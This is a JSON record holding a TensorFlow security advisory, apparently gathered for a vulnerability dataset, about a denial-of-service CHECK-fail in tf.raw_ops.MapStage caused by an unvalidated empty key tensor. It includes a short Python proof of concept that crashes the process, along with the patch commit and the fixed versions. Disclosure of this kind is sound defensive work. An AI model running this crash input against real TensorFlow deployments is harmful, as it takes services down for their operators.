{"description": "### Impact\nAn attacker can trigger a denial of service via a `CHECK`-fail in `tf.raw_ops.MapStage`:\n\n```python\nimport tensorflow as tf\n  \ntf.raw_ops.MapStage(\n  key=tf.constant([], shape=[0, 0, 0, 0], dtype=tf.int64),\n  indices=tf.constant((0), dtype=tf.int32),\n  values=[tf.constant((0), dtype=tf.int32)],\n  dtypes=[tf.int32,\n  tf.int64],\n  capacity=0,\n  memory_limit=0,\n  container='',\n  shared_name='')\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/map_stage_op.cc#L513) does not check that the `key` input is a valid non-empty tensor.\n  \n### Patches\nWe have patched the issue in GitHub commit [d7de67733925de196ec8863a33445b73f9562d1d](https://github.com/tensorflow/tensorflow/commit/d7de67733925de196ec8863a33445b73f9562d1d).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security  guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.", "methods": ["Triggered a denial of service via a CHECK-fail in MapStage.", "Exploited a vulnerability in the implementation of MapStage in TensorFlow."]}
